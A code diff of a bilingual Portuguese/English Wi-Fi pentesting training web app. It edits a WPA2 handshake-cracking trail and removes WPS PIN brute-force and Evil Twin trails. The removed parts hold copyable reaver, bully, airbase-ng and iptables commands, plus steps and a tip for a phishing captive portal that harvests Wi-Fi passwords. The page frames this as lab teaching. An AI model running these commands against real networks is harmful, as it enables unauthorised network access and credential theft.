@@ -414,15 +414,7 @@
     <div id="page-content" class="page-content" style="display: none;"></div>
 
     <!-- Scroll to Top -->
-    <button class="scroll-top" id="scroll-top" aria-label="Scroll to top"><i class="fa-solid fa-chevron-up"></i></button>
-
-
-    
-    
-    
-    
-    <!-- ============ TEMPLATES FOR SPA PAGES (OFFLINE FRIENDLY) ============ -->
-    <template id="template-wpa2">
+    <button class="scroll-top" id="scroll-top" aria-label="Scroll to top"><i class="fa-solid fa-chevro    <template id="template-wpa2">
 <!-- TRILHA WPA2-PSK — Sem terminal simulado, com i18n -->
 <div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
 
@@ -437,49 +429,15 @@
             <span data-lang-pt>Aprenda a capturar o handshake de 4 vias e quebre a senha com ataque offline.</span>
             <span data-lang-en>Learn to capture the 4-way handshake and crack the password with an offline attack.</span>
         </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
+        <div style="margin-top: var(--space-4); max-width: 500px;">
             <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
                 <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
                 <span class="progress-label text-sm" style="color: var(--accent-primary);">0%</span>
             </div>
             <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="wpa2" style="width: 0%;"></div></div>
-        </div>
-    </div>
-
-    <!-- Shared Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);">
-            <i class="fa-solid fa-sliders" style="color: var(--accent-primary);"></i>
-            <span data-lang-pt>Configuração do Ambiente</span><span data-lang-en>Environment Setup</span>
-        </h3>
-        <p class="text-muted text-sm" style="margin-bottom: var(--space-5);">
-            <span data-lang-pt>Preencha com os dados do seu lab. Os comandos serão atualizados automaticamente.</span>
-            <span data-lang-en>Fill in your lab data. Commands will update automatically.</span>
-        </p>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Interface de Rede</span><span data-lang-en>Network Interface</span></label>
-                <input type="text" id="iface" value="wlan0" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
-                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span> (CH)</label>
-                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>STATION (<span data-lang-pt>MAC do Cliente</span><span data-lang-en>Client MAC</span>)</label>
-                <input type="text" id="client" value="AA:BB:CC:DD:EE:FF" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
-                <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('WPA2_Handshake')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -492,6 +450,15 @@
             <span data-lang-pt>Placas de rede normais operam em <strong>Modo Gerenciado</strong>, ouvindo apenas pacotes destinados a elas. Para pentest, ativamos o <strong>Modo Monitor</strong> para escutar todo o tráfego de rádio. Antes, matamos processos que podem interferir.</span>
             <span data-lang-en>Normal network cards operate in <strong>Managed Mode</strong>, only listening to packets addressed to them. For pentesting, we enable <strong>Monitor Mode</strong> to listen to all radio traffic. First, we kill interfering processes.</span>
         </p>
+        <div class="phase-inputs">
+            <div class="phase-inputs-title"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Preencha antes de continuar</span><span data-lang-en>Fill in before continuing</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Interface de Rede</span><span data-lang-en>Network Interface</span></label>
+                    <input type="text" id="iface" value="wlan0" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
             <span class="command-label"><span data-lang-pt>1. Matar processos conflitantes:</span><span data-lang-en>1. Kill interfering processes:</span></span>
@@ -524,6 +491,19 @@
             <span data-lang-pt>Use <code>airodump-ng</code> para escanear todas as redes. Quando encontrar o alvo, pare (<kbd>Ctrl+C</kbd>) e inicie um escaneamento focado, salvando a captura em arquivo.</span>
             <span data-lang-en>Use <code>airodump-ng</code> to scan all networks. When you find the target, stop (<kbd>Ctrl+C</kbd>) and start a focused scan, saving the capture to a file.</span>
         </p>
+        <div class="phase-inputs">
+            <div class="phase-inputs-title"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Dados encontrados no scan</span><span data-lang-en>Data found in the scan</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
+                    <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+                </div>
+                <div class="input-group">
+                    <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span> (CH)</label>
+                    <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-radar"></i> <span data-lang-pt>Escaneamento Geral</span><span data-lang-en>General Scan</span></div>
             <div class="command-box" style="margin-bottom: var(--space-6);">
@@ -555,6 +535,15 @@
             <span data-lang-pt>Precisamos capturar o <strong>Handshake de 4 vias</strong> — quando um dispositivo se autentica. Usamos <code>aireplay-ng</code> para forçar a desconexão de um cliente. Ao reconectar, o handshake é capturado no terminal da Fase 2.</span>
             <span data-lang-en>We need to capture the <strong>4-way Handshake</strong> — when a device authenticates. We use <code>aireplay-ng</code> to force a client disconnect. On reconnect, the handshake is captured in the Phase 2 terminal.</span>
         </p>
+        <div class="phase-inputs">
+            <div class="phase-inputs-title"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>MAC do cliente (visto no airodump)</span><span data-lang-en>Client MAC (seen in airodump)</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label>STATION (<span data-lang-pt>MAC do Cliente</span><span data-lang-en>Client MAC</span>)</label>
+                    <input type="text" id="client" value="AA:BB:CC:DD:EE:FF" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-bolt"></i> <span data-lang-pt>Pacotes Deauth</span><span data-lang-en>Deauth Packets</span></div>
             <div class="command-box">
@@ -581,6 +570,15 @@
             <span data-lang-pt>Agora o ataque é <strong>100% offline</strong>. O <code>aircrack-ng</code> testa cada senha da wordlist contra o handshake. Simples mas mais lento que GPU.</span>
             <span data-lang-en>Now the attack is <strong>100% offline</strong>. <code>aircrack-ng</code> tests each password from the wordlist against the handshake. Simple but slower than GPU.</span>
         </p>
+        <div class="phase-inputs">
+            <div class="phase-inputs-title"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Caminho da wordlist</span><span data-lang-en>Wordlist path</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
+                    <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-key"></i> <span data-lang-pt>Quebrando a Senha</span><span data-lang-en>Cracking the Password</span></div>
             <div class="command-box">
@@ -654,354 +652,7 @@
         </div>
     </div>
 </div>
-
     </template>
-    <template id="template-wps">
-<!-- TRILHA WPS — Ataque WPS Pin com Reaver/Bully -->
-<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
-
-    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
-        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
-        <span class="badge badge-beginner"><span data-lang-pt>⭐ Iniciante</span><span data-lang-en>⭐ Beginner</span></span>
-    </div>
-    <div style="margin-bottom: var(--space-10);">
-        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-unlock" style="color: var(--accent-warning);"></i> <span data-lang-pt>Trilha WPS Pin Attack</span><span data-lang-en>WPS Pin Attack Trail</span></h1>
-        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
-            <span data-lang-pt>O WPS (Wi-Fi Protected Setup) tem uma vulnerabilidade no PIN de 8 dígitos que pode ser explorada com brute force. Se o roteador não bloquear tentativas, a senha é revelada em horas.</span>
-            <span data-lang-en>WPS (Wi-Fi Protected Setup) has a vulnerability in its 8-digit PIN that can be exploited with brute force. If the router doesn't lock out attempts, the password is revealed in hours.</span>
-        </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
-            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
-                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
-                <span class="progress-label text-sm" style="color: var(--accent-warning);">0%</span>
-            </div>
-            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="wps" style="width: 0%; background: var(--accent-warning);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-warning);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Interface</span><span data-lang-en>Interface</span></label>
-                <input type="text" id="iface" value="wlan0" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
-                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
-                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
-            </div>
-        </div>
-    </div>
-
-    <!-- FASE 1 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-warning);">Fase 1</div>
-        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Mesma preparação da trilha WPA2 — ativar modo monitor na placa de rede.</span>
-            <span data-lang-en>Same preparation as the WPA2 trail — enable monitor mode on the network card.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code>sudo airmon-ng check kill</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="command-box">
-                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span></label>
-    </div>
-
-    <!-- FASE 2 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-warning);">Fase 2</div>
-        <h2><i class="fa-solid fa-magnifying-glass"></i> <span data-lang-pt>Escaneando Redes com WPS</span><span data-lang-en>Scanning WPS-Enabled Networks</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>O <code>wash</code> é uma ferramenta especializada que detecta redes com WPS ativo. Ele mostra se o WPS está <strong>bloqueado (Lck: Yes)</strong> ou aberto para ataque.</span>
-            <span data-lang-en><code>wash</code> is a specialized tool that detects WPS-enabled networks. It shows whether WPS is <strong>locked (Lck: Yes)</strong> or open for attack.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-wifi"></i> <span data-lang-pt>Detectar WPS</span><span data-lang-en>Detect WPS</span></div>
-            <div class="command-box">
-                <code data-cmd="sudo wash -i {ifaceMon}">sudo wash -i wlan0mon</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-warning">
-                <i class="fa-solid fa-lock"></i>
-                <span><span data-lang-pt><strong>Atenção:</strong> Se a coluna <code>Lck</code> mostrar <strong>Yes</strong>, o roteador bloqueia tentativas de PIN. O ataque não funcionará neste caso.</span><span data-lang-en><strong>Warning:</strong> If the <code>Lck</code> column shows <strong>Yes</strong>, the router blocks PIN attempts. The attack won't work in this case.</span></span>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Rede com WPS aberto encontrada</span><span data-lang-en>WPS-enabled network found</span></span></label>
-    </div>
-
-    <!-- FASE 3 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-warning);">Fase 3</div>
-        <h2><i class="fa-solid fa-key"></i> <span data-lang-pt>Brute Force com Reaver</span><span data-lang-en>Brute Force with Reaver</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt><code>Reaver</code> automatiza o brute force do PIN WPS. Ele testa todas as combinações possíveis (11.000 tentativas máximo) e quando encontra o PIN correto, o roteador entrega a senha WPA.</span>
-            <span data-lang-en><code>Reaver</code> automates WPS PIN brute force. It tests all possible combinations (11,000 max attempts) and when the correct PIN is found, the router reveals the WPA password.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-hammer"></i> Reaver</div>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code data-cmd="sudo reaver -i {ifaceMon} -b {bssid} -c {channel} -vv">sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-info">
-                <i class="fa-solid fa-clock"></i>
-                <span><span data-lang-pt><strong>Tempo:</strong> Pode levar de 2 a 10+ horas dependendo do roteador. Use <code>-d 2</code> para delay entre tentativas se houver rate-limiting.</span><span data-lang-en><strong>Time:</strong> Can take 2 to 10+ hours depending on the router. Use <code>-d 2</code> for delay between attempts if there's rate-limiting.</span></span>
-            </div>
-            <div class="action-title" style="margin-top: var(--space-6);"><i class="fa-solid fa-wand-magic-sparkles"></i> Pixie Dust (<span data-lang-pt>ataque rápido</span><span data-lang-en>fast attack</span>)</div>
-            <p class="text-sm text-muted" style="margin-bottom: var(--space-3);">
-                <span data-lang-pt>Se o roteador for vulnerável ao Pixie Dust, o PIN é encontrado em segundos:</span>
-                <span data-lang-en>If the router is vulnerable to Pixie Dust, the PIN is found in seconds:</span>
-            </p>
-            <div class="command-box">
-                <code data-cmd="sudo reaver -i {ifaceMon} -b {bssid} -c {channel} -vv -K">sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>PIN WPS encontrado</span><span data-lang-en>WPS PIN found</span></span></label>
-    </div>
-
-    <!-- FASE 4 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-warning);">Fase 4</div>
-        <h2><i class="fa-solid fa-arrows-rotate"></i> <span data-lang-pt>Alternativa: Bully</span><span data-lang-en>Alternative: Bully</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt><code>Bully</code> é uma alternativa ao Reaver que pode funcionar melhor em alguns roteadores. Usa uma abordagem diferente de comunicação com o WPS.</span>
-            <span data-lang-en><code>Bully</code> is a Reaver alternative that may work better on some routers. It uses a different approach to communicate with WPS.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-hammer"></i> Bully</div>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code data-cmd="sudo bully {ifaceMon} -b {bssid} -c {channel} -v 3">sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-info">
-                <i class="fa-solid fa-lightbulb"></i>
-                <span><span data-lang-pt><strong>Dica:</strong> Se Reaver não funcionar, tente Bully. Cada um tem melhor compatibilidade com diferentes chipsets de roteador.</span><span data-lang-en><strong>Tip:</strong> If Reaver doesn't work, try Bully. Each has better compatibility with different router chipsets.</span></span>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Senha WPA obtida via WPS</span><span data-lang-en>WPA password obtained via WPS</span></span></label>
-    </div>
-
-    <!-- Completion -->
-    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
-        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-warning); margin-bottom: var(--space-4); display: block;"></i>
-        <h2><span data-lang-pt>Trilha WPS Completa!</span><span data-lang-en>WPS Trail Complete!</span></h2>
-        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
-            <span data-lang-pt>Explore as outras trilhas para técnicas mais avançadas.</span>
-            <span data-lang-en>Explore other trails for more advanced techniques.</span>
-        </p>
-        <div class="flex justify-center gap-4 flex-wrap">
-            <a href="#/eviltwin" class="btn btn-primary"><i class="fa-solid fa-arrow-right"></i> Evil Twin</a>
-            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
-        </div>
-    </div>
-</div>
-
-    </template>
-    <template id="template-eviltwin">
-<!-- TRILHA EVIL TWIN — Fake AP + Captive Portal -->
-<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
-
-    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
-        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
-        <span class="badge badge-advanced"><span data-lang-pt>⭐⭐⭐ Avançado</span><span data-lang-en>⭐⭐⭐ Advanced</span></span>
-    </div>
-    <div style="margin-bottom: var(--space-10);">
-        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-ghost" style="color: var(--accent-danger);"></i> <span data-lang-pt>Trilha Evil Twin Attack</span><span data-lang-en>Evil Twin Attack Trail</span></h1>
-        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
-            <span data-lang-pt>Crie um ponto de acesso falso que imita uma rede legítima. Quando a vítima se conectar ao seu AP, você pode interceptar credenciais com um captive portal falso.</span>
-            <span data-lang-en>Create a fake access point that mimics a legitimate network. When the victim connects to your AP, you can intercept credentials with a fake captive portal.</span>
-        </p>
-        <div style="margin-top: var(--space-4); max-width: 400px;">
-            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
-                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
-                <span class="progress-label text-sm" style="color: var(--accent-danger);">0%</span>
-            </div>
-            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="eviltwin" style="width: 0%; background: var(--accent-danger);"></div></div>
-        </div>
-    </div>
-
-    <!-- Inputs -->
-    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
-        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-danger);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Interface Monitor</span><span data-lang-en>Monitor Interface</span></label>
-                <input type="text" id="iface" value="wlan0" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>BSSID (<span data-lang-pt>MAC do Roteador Alvo</span><span data-lang-en>Target Router MAC</span>)</label>
-                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="input-group">
-                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
-                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
-            </div>
-            <div class="input-group">
-                <label>ESSID (<span data-lang-pt>Nome da Rede Alvo</span><span data-lang-en>Target Network Name</span>)</label>
-                <input type="text" id="essid" value="LabPentest_5G" data-cmd-input>
-            </div>
-        </div>
-    </div>
-
-    <div class="info-box info-danger" style="margin-bottom: var(--space-8);">
-        <i class="fa-solid fa-skull-crossbones"></i>
-        <span><span data-lang-pt><strong>Aviso:</strong> Este ataque envolve engenharia social e criação de infraestrutura falsa. Use <strong>apenas</strong> em seu próprio laboratório com dispositivos de teste.</span><span data-lang-en><strong>Warning:</strong> This attack involves social engineering and creating fake infrastructure. Use <strong>only</strong> in your own lab with test devices.</span></span>
-    </div>
-
-    <!-- FASE 1 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-danger);">Fase 1</div>
-        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Primeiro, ative o modo monitor e escaneie as redes para identificar o alvo.</span>
-            <span data-lang-en>First, enable monitor mode and scan networks to identify the target.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code>sudo airmon-ng check kill</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="command-box">
-                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span></label>
-    </div>
-
-    <!-- FASE 2 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-danger);">Fase 2</div>
-        <h2><i class="fa-solid fa-signal"></i> <span data-lang-pt>Criar o AP Falso</span><span data-lang-en>Create the Fake AP</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Use <code>airbase-ng</code> para criar um ponto de acesso falso com o <strong>mesmo nome (ESSID)</strong> da rede alvo. Isso cria uma interface virtual <code>at0</code> que será a "porta" para os clientes.</span>
-            <span data-lang-en>Use <code>airbase-ng</code> to create a fake access point with the <strong>same name (ESSID)</strong> as the target network. This creates a virtual interface <code>at0</code> that will be the "gateway" for clients.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-ghost"></i> <span data-lang-pt>Iniciar AP Falso</span><span data-lang-en>Start Fake AP</span></div>
-            <div class="command-box">
-                <code data-cmd="sudo airbase-ng -e {essid} -c {channel} {ifaceMon}">sudo airbase-ng -e LabPentest_5G -c 6 wlan0mon</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-info">
-                <i class="fa-solid fa-circle-info"></i>
-                <span><span data-lang-pt>Deixe rodando e abra <strong>outro terminal</strong> para os próximos passos. A interface <code>at0</code> será criada.</span><span data-lang-en>Keep running and open <strong>another terminal</strong> for next steps. The <code>at0</code> interface will be created.</span></span>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>AP falso criado com at0</span><span data-lang-en>Fake AP created with at0</span></span></label>
-    </div>
-
-    <!-- FASE 3 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-danger);">Fase 3</div>
-        <h2><i class="fa-solid fa-network-wired"></i> <span data-lang-pt>Configurar DHCP e Rede</span><span data-lang-en>Configure DHCP and Network</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Precisamos configurar a interface <code>at0</code> com um IP e subir um servidor DHCP para que os clientes recebam IP automaticamente ao conectar ao nosso AP falso.</span>
-            <span data-lang-en>We need to configure the <code>at0</code> interface with an IP and start a DHCP server so clients receive IP automatically when connecting to our fake AP.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-server"></i> <span data-lang-pt>Configurar Interface</span><span data-lang-en>Configure Interface</span></div>
-            <span class="command-label"><span data-lang-pt>1. Atribuir IP à interface at0:</span><span data-lang-en>1. Assign IP to at0 interface:</span></span>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code>sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <span class="command-label"><span data-lang-pt>2. Configurar rota:</span><span data-lang-en>2. Configure route:</span></span>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code>sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <span class="command-label"><span data-lang-pt>3. Iniciar DHCP server (dnsmasq):</span><span data-lang-en>3. Start DHCP server (dnsmasq):</span></span>
-            <div class="command-box">
-                <code>sudo dnsmasq -C /dev/null -i at0 --dhcp-range=10.0.0.10,10.0.0.50,12h --no-daemon --log-queries</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-        </div>
-        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>DHCP rodando — clientes recebem IP</span><span data-lang-en>DHCP running — clients receive IP</span></span></label>
-    </div>
-
-    <!-- FASE 4 -->
-    <div class="step-block reveal">
-        <div class="step-indicator" style="background: var(--accent-danger);">Fase 4</div>
-        <h2><i class="fa-solid fa-globe"></i> <span data-lang-pt>Captive Portal (Phishing)</span><span data-lang-en>Captive Portal (Phishing)</span></h2>
-        <p class="lesson-text">
-            <span data-lang-pt>Configure regras de <code>iptables</code> para redirecionar todo o tráfego HTTP para uma página falsa (captive portal) que pede a senha Wi-Fi. Use o <code>apache2</code> ou <code>python3 -m http.server</code> para servir a página.</span>
-            <span data-lang-en>Configure <code>iptables</code> rules to redirect all HTTP traffic to a fake page (captive portal) that asks for the Wi-Fi password. Use <code>apache2</code> or <code>python3 -m http.server</code> to serve the page.</span>
-        </p>
-        <div class="action-area">
-            <div class="action-title"><i class="fa-solid fa-filter"></i> <span data-lang-pt>Regras de Redirecionamento</span><span data-lang-en>Redirect Rules</span></div>
-            <span class="command-label"><span data-lang-pt>1. Redirecionar HTTP (porta 80) para o captive portal:</span><span data-lang-en>1. Redirect HTTP (port 80) to the captive portal:</span></span>
-            <div class="command-box" style="margin-bottom: var(--space-4);">
-                <code>sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <span class="command-label"><span data-lang-pt>2. Servir a página de phishing:</span><span data-lang-en>2. Serve the phishing page:</span></span>
-            <div class="command-box">
-                <code>sudo python3 -m http.server 8080 --directory /path/to/portal/</code>
-                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
-            </div>
-            <div class="info-box info-info">
-                <i class="fa-solid fa-palette"></i>
-                <span><span data-lang-pt><strong>Dica:</strong> Crie uma página HTML que imite a tela de login do roteador do ISP da vítima. Quanto mais convincente, maior a taxa de sucesso.</span><span data-lang-en><strong>Tip:</strong> Create an HTML page that mimics the victim's ISP router login screen. The more convincing, the higher the success rate.</span></span>
